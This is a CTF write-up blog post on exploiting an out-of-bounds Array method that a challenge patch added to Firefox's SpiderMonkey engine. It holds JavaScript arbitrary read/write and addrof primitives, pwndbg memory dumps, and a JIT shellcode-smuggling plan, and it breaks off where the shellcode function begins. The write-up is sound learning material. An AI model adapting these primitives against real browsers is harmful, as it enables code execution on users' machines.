<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="corCTF 2021 - outfoxed" /><meta name="author" content="Duc Phan" /><meta property="og:locale" content="en_US" /><meta name="description" content="12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!" /><meta property="og:description" content="12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!" /><link rel="canonical" href="https://ret2.life/posts/corCTF-2021/" /><meta property="og:url" content="https://ret2.life/posts/corCTF-2021/" /><meta property="og:site_name" content="ret2life" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-23T11:47:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="corCTF 2021 - outfoxed" /><meta name="twitter:site" content="@flyingpassword" /><meta name="twitter:creator" content="@Duc Phan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Duc Phan"},"dateModified":"2021-08-23T11:47:00+08:00","datePublished":"2021-08-23T11:47:00+08:00","description":"12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!","headline":"corCTF 2021 - outfoxed","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2.life/posts/corCTF-2021/"},"url":"https://ret2.life/posts/corCTF-2021/"}</script><title>corCTF 2021 - outfoxed | ret2life</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ret2life"><meta name="application-name" content="ret2life"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1417881771534819331/0AuUptMd_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ret2life</a></div><div class="site-subtitle font-italic">From CTF write-ups to everyday life kind of things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span></span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ducphanduyagentp" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/flyingpassword" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['youreallythingimmaputemail','on.here?'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> </a> </span> <span>corCTF 2021 - outfoxed</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" ></span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>corCTF 2021 - outfoxed</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Duc Phan </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2021-08-23 11:47:00 +0800" >2021-08-23 11:47:00 +0800<i class="unloaded">2021-08-23T11:47:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2238 ">12 </span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 50% 50%'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/outfoxed/outfoxed-01.png" class="preview-img" alt="Preview Image" width="50%" height="50%"><p>12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!</p><h2 id="challenge-overview">Challenge Overview</h2><p>This is a javascript engine pwn challenge and our target is Firefox’s Spidermonkey. We are not provided with the built binaries but with patch file, build config file and commit log. Firefox does not use the regular git VCS like Chrome or V8 so it was a bit more difficult in the beginning for v8 people like me.</p><h2 id="building-spidermonkey">Building Spidermonkey</h2><p>The official build instruction <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> is pretty good already. Building a specific revision and building the debug version is a bit more work.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>apt-get <span class="nb">install </span>python3 python3-dev
python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">--user</span> mercurial
curl https://hg.mozilla.org/mozilla-central/raw-file/default/python/mozboot/bin/bootstrap.py <span class="nt">-O</span>
python3 bootstrap.py

<span class="nb">cd </span>mozilla-unified

<span class="c"># Or you can just clone the beta repo where the challenge commit is</span>
<span class="c"># hg clone https://hg.mozilla.org/releases/mozilla-beta/ mozilla-unified</span>

<span class="c"># Checkout the correct revision</span>
hg update <span class="nt">-r</span> f4922b9e9a6b
</pre></table></code></div></div><p>To build with the provided config, we just need to copy <code class="language-plaintext highlighter-rouge">mozconfig</code> over to <code class="language-plaintext highlighter-rouge">mozilla-unified</code>. In my case, I need to build a debug version so here is my config file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre># Build only the SpiderMonkey JS test shell
ac_add_options --enable-application=js
ac_add_options --enable-debug
ac_add_options --disable-optimize
ac_add_options --disable-tests
mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/obj-debug-@CONFIG_GUESS@
</pre></table></code></div></div><p>After that, we just do <code class="language-plaintext highlighter-rouge">./mach build</code> and wait. If you run into errors saying no <code class="language-plaintext highlighter-rouge">nspr &gt;= 4.32</code> or something like that, you will need to install <code class="language-plaintext highlighter-rouge">nspr-4.32</code> from source. The result binary will be in <code class="language-plaintext highlighter-rouge">obj-debug-x86_64-pc-linux-gnu/dist/bin</code>. To start debugging, just run the <code class="language-plaintext highlighter-rouge">js</code> binary in gdb like we do with d8.</p><p>The debug version provide the useful <code class="language-plaintext highlighter-rouge">dumpObject</code> method, which we can use to get the address and basic layout of objects. To get passed some checks when doing OOB on the debug version, I also introduced some small patches.</p><div class="language-diff highlighter-rouge"><div class="code-header"> <span text-data=" Diff "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="gh">diff --git a/js/src/vm/NativeObject.h b/js/src/vm/NativeObject.h
</span><span class="gd">--- a/js/src/vm/NativeObject.h
</span><span class="gi">+++ b/js/src/vm/NativeObject.h
</span><span class="p">@@ -573,7 +573,7 @@</span> class NativeObject : public JSObject {
   HeapSlotArray getDenseElements() const { return HeapSlotArray(elements_); }
 
   const Value&amp; getDenseElement(uint32_t idx) const {
<span class="gd">-    MOZ_ASSERT(idx &lt; getDenseInitializedLength());
</span><span class="gi">+    // MOZ_ASSERT(idx &lt; getDenseInitializedLength());
</span>     return elements_[idx];
   }
   bool containsDenseElement(uint32_t idx) {
<span class="p">@@ -1317,7 +1317,7 @@</span> class NativeObject : public JSObject {
     elements_[index].init(this, HeapSlot::Element, unshiftedIndex(index), val);
   }
   void setDenseElementUnchecked(uint32_t index, const Value&amp; val) {
<span class="gd">-    MOZ_ASSERT(index &lt; getDenseInitializedLength());
</span><span class="gi">+    // MOZ_ASSERT(index &lt; getDenseInitializedLength());
</span>     MOZ_ASSERT(!denseElementsAreFrozen());
     checkStoredValue(val);
     elements_[index].set(this, HeapSlot::Element, unshiftedIndex(index), val);
</pre></table></code></div></div><h2 id="patch-analysis">Patch Analysis</h2><p>Looking at the patch, it is quite obvious that this is an OOB r/w bug in Array. The patch introduce the <code class="language-plaintext highlighter-rouge">oob</code> method to Array objects</p><ul><li><code class="language-plaintext highlighter-rouge">oob(idx)</code> will get the element at index <code class="language-plaintext highlighter-rouge">idx</code><li><code class="language-plaintext highlighter-rouge">oob(idx, val)</code> will set the element at index <code class="language-plaintext highlighter-rouge">idx</code> to <code class="language-plaintext highlighter-rouge">val</code></ul><div class="language-diff highlighter-rouge"><div class="code-header"> <span text-data=" Diff "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gi">+bool js::array_oob(JSContext* cx, unsigned argc, Value* vp) {
+  CallArgs args = CallArgsFromVp(argc, vp);
+  RootedObject obj(cx, ToObject(cx, args.thisv()));
+  double index;
+  if (args.length() == 1) {
+    if (!ToInteger(cx, args[0], &amp;index)) {
+      return false;
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else if (args.length() == 2) {
+    if (!ToInteger(cx, args[0], &amp;index)) {
+      return false;
+    }
+    NativeObject* nobj =
+        obj-&gt;is&lt;NativeObject&gt;() ? &amp;obj-&gt;as&lt;NativeObject&gt;() : nullptr;
+    if (nobj) {
+      nobj-&gt;setDenseElement(index, args[1]);
+    } else {
+      puts("Not dense");
+    }
+    GetTotallySafeArrayElement(cx, obj, index, args.rval());
+  } else {
+    return false;
+  }
+  return true;
+}
</span></pre></table></code></div></div><h2 id="exploit-strategy">Exploit Strategy</h2><p>OOB r/w is already given to us, but how do we eventually get code execution? There are several things that we need to study:</p><ol><li><strong>What does the OOB r/w give us?</strong> In particular:<ol><li><strong>What useful information can we read past the Array boundaries?</strong> In this case, we can look for heap pointers and code pointers, especially something like ArrayBuffer’s data pointer because that will give more powerful r/w pritimitives.<li><strong>Where and what will we write OOB, and to achieve what purpose?</strong> To get arbitrary read/write, we can overwrite the data pointer of ArrayBuffer or Array, but we need to locate its OOB offset as well.</ol><li><strong>How do we get addrof and/or fakeobj?</strong><ol><li>In v8, we can confuse an Array of double and put an object in the confused Array to get its address. Can this be applicable to SM too?<li>We can use arbitrary read to read from wherever the address of our object is stored.</ol><li>How do we get code execution? And how is it different from v8?<ol><li>Is JIT/WASM rwx page present? (Spoiler alert! It’s gone for a while)<li>Can we hijack control flow by overwriting code address of native functions?</ol></ol><p>Most of these questions will be answered throughout the write-up.</p><h2 id="initial-oob">Initial OOB</h2><p>Let’s inspect the layout of an Array in memory to see what’s interesting. The <code class="language-plaintext highlighter-rouge">dumpObject</code> function can be used to get the address and layout of object. We can see right away that there is a pointer to the element array at offset <code class="language-plaintext highlighter-rouge">0x10</code>. So if we can corrupt this, we may be able to achieve arbitrary r/w.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>pwndbg&gt; tele 0x19ed076006a0
00:0000│   0x19ed076006a0 —▸ 0x244aead9b220 —▸ 0x244aead74208 —▸ 0x555558f2c680 (js::ArrayObject::class_) —▸ 0x555557928831 ◂— ...
01:0008│   0x19ed076006a8 —▸ 0x555557872f38 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│   0x19ed076006b0 —▸ 0x19ed076006c8 ◂— 0x3ff199999999999a
03:0018│   0x19ed076006b8 ◂— 0x400000000
04:0020│   0x19ed076006c0 ◂— 0x400000006
05:0028│   0x19ed076006c8 ◂— 0x3ff199999999999a
06:0030│   0x19ed076006d0 ◂— 0x3ff3333333333333
07:0038│   0x19ed076006d8 ◂— 0x3ff4cccccccccccd
</pre></table></code></div></div><p>Another interesting object is ArrayBuffer and TypedArray. This is an Uint8Array of length 8 with its data pointer at offst <code class="language-plaintext highlighter-rouge">0x30</code>. Fortunately, we can see that our OOB Array and this TypedArray is really close to each other, which is a perfect layout to corrupt this TypedArray data pointer to get arbitrary r/w.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>pwndbg&gt; tele 0x19ed076007a8
00:0000│   0x19ed076007a8 —▸ 0x244aead9bc00 —▸ 0x244aead74280 —▸ 0x555558f40280 (js::TypedArrayObject::classes+48) —▸ 0x5555578a441a ◂— ...
01:0008│   0x19ed076007b0 —▸ 0x555557872f38 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│   0x19ed076007b8 —▸ 0x555557870008 (emptyElementsHeader+16) ◂— 0xfff9800000000000
03:0018│   0x19ed076007c0 ◂— 0xfffa000000000000
04:0020│   0x19ed076007c8 ◂— 0x8
05:0028│   0x19ed076007d0 ◂— 0x0
06:0030│   0x19ed076007d8 —▸ 0x19ed076007e0 ◂— 0x4343434343434343 ('CCCCCCCC')
07:0038│   0x19ed076007e0 ◂— 0x4343434343434343 ('CCCCCCCC')
</pre></table></code></div></div><h2 id="arbitrary-readwrite">Arbitrary Read/Write</h2><p>With the information we get from the initial OOB r/w, we have 2 ways to get arbitrary r/w now:</p><ol><li>Corrupt the data pointer of an Array after out OOB Array. I tried this initially and ran into some complications with how SM interprets the data. Basically, it is not easy to just point this data pointer to anywhere and read it as a double value (probably due to how SM values are represented, double values and pointers are differentiated, and the array will still interpret the pointer as an object, not a double value.) It was hard to get addrof primitive this way later on, so I switched to the 2nd method below.<li>Corrupt the data pointer of a TypedArray after out OOB Array. This is the more hassle-free way to read and write data, although we have a relatively small buffer, but 8 bytes is enough, and it is all raw bytes.</ol><p>We have the following arb r/w primitives:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nx">arb_offset</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
<span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">);</span>
<span class="nx">victim_ta</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

<span class="kd">function</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">x</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="nx">arb_offset</span><span class="p">,</span> <span class="nx">addr</span><span class="p">.</span><span class="nf">toDouble</span><span class="p">())</span>
    <span class="c1">// Not sure why I need this, maybe not.</span>
    <span class="nx">x</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="nx">arb_offset</span> <span class="o">-</span> <span class="mi">3</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xfffa000000000000</span><span class="nx">n</span><span class="p">).</span><span class="nf">toDouble</span><span class="p">())</span>
    <span class="nx">read_ta</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">victim_ta</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">read_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">x</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="nx">arb_offset</span><span class="p">,</span> <span class="nx">addr</span><span class="p">.</span><span class="nf">toDouble</span><span class="p">())</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">victim_ta</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">((</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="nx">n</span><span class="p">))</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="weak-addrof">(Weak) Addrof</h2><p>Reading several resources <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> <sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>, I figured out that setting a property of an object to a target object will allow us to leak the address of that target object. In this case, I was trying to leak address of the JIT-ed function. We can see a pointer to this victim_obj in the memory of <code class="language-plaintext highlighter-rouge">victim_ta</code> now.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nx">victim_obj</span> <span class="o">=</span> <span class="nx">sc</span><span class="p">;</span>
<span class="nx">victim_ta</span><span class="p">.</span><span class="nx">what</span> <span class="o">=</span> <span class="nx">victim_obj</span><span class="p">;</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>pwndbg&gt; tele 0x19ed076007a8
00:0000│   0x19ed076007a8 —▸ 0x244aeada1180 —▸ 0x244aead74280 —▸ 0x555558f40280 (js::TypedArrayObject::classes+48) —▸ 0x5555578a441a ◂— ...
01:0008│   0x19ed076007b0 —▸ 0x19ed07600ad8 ◂— 0xfffe19ed076008c8
02:0010│   0x19ed076007b8 —▸ 0x555557870008 (emptyElementsHeader+16) ◂— 0xfff9800000000000
03:0018│   0x19ed076007c0 ◂— 0xfffa000000000000
04:0020│   0x19ed076007c8 ◂— 0x8
05:0028│   0x19ed076007d0 ◂— 0x0
06:0030│   0x19ed076007d8 —▸ 0x19ed076007e0 ◂— 0x4343434343434343 ('CCCCCCCC')
07:0038│   0x19ed076007e0 ◂— 0x4343434343434343 ('CCCCCCCC')
pwndbg&gt; c
Continuing.
js&gt; dumpObject(sc)
object 19ed076008c8
  global 244aead76090 [global]
  class 555558f3b1e0 Function
  shape 244aead75160
  flags:
  proto &lt;function  at 244aead7b040&gt;
  properties:
js&gt; 
</pre></table></code></div></div><p>We see that there is a pointer to the object at offset <code class="language-plaintext highlighter-rouge">0x8</code>. The object address is represented differently with the <code class="language-plaintext highlighter-rouge">0xfffe</code> tag, but we can certainly leak this address using the OOB and arbitrary read/write.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nx">leak_offset</span> <span class="o">=</span> <span class="mi">8</span>
<span class="c1">// Leak the pointer containing `what` property object address</span>
<span class="nx">leak</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="nx">leak_offset</span><span class="p">)</span>

<span class="c1">// Read the object address</span>
<span class="nx">x</span><span class="p">.</span><span class="nf">oob</span><span class="p">(</span><span class="nx">arb_offset</span><span class="p">,</span> <span class="nx">leak</span><span class="p">)</span>
<span class="nx">read_ta</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">victim_ta</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
<span class="nx">jitfunc_addr</span> <span class="o">=</span> <span class="nx">read_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="nx">_ffffffffn</span><span class="p">;</span>
</pre></table></code></div></div><p>It is worth noting that I could only leak the address of object once, and leaking any object again may require building another array and victim layout. For my exploit, this is enough.</p><h2 id="code-execution">Code Execution</h2><p>This is probably the most interesting part. In v8, we are basically done if we can figure out the address of a rwx WASM page, but in SM, it is not so easy. There is no rwx WASM or JIT page.</p><p>The resources suggest that there is a way that way can smuggle executable code into JIT-ed functions, and point the JIT-ed code to the desired code address. We do this by JIT-ing a function with just constant values where they are actually shellcode. Because the code is marked executable, these bytes will be read-executable. The only disadvantage is that we need to hardcode all of these values, so no dynamic shellcode at this stage (e.g. we cannot write shellcode based on some info leak before that). But this is already good enough.</p><p>There are 2 tasks left:</p><ol><li>Search the memory for the address of our smuggled shellcode.<li>Figure out the code pointer of a victim JIT-ed function and overwrite this pointer.</ol><p>In the shellcode function, we put a marker value so we can search for it in memory by scanning:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">sc</span><span class="p">()</span> <span class="p">{</span>
